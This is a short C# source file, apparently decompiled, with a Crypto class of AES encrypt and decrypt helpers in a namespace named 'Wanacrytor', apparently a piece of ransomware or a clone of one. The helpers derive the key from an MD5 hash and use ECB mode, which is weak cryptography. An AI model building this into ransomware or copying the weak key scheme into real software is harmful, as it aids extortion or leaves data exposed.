using System;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Wanacrytor;

public class Crypto
{
	public string AES_Encrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		try
		{
			byte[] destinationArray = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, destinationArray, 0, 16);
			Array.Copy(sourceArray, 0, destinationArray, 15, 16);
			rijndaelManaged.Key = destinationArray;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			byte[] bytes = Encoding.ASCII.GetBytes(input);
			return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Encrypted ERROR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string AES_Decrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		try
		{
			byte[] destinationArray = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, destinationArray, 0, 16);
			Array.Copy(sourceArray, 0, destinationArray, 15, 16);
			rijndaelManaged.Key = destinationArray;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Encrypted ERROR";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
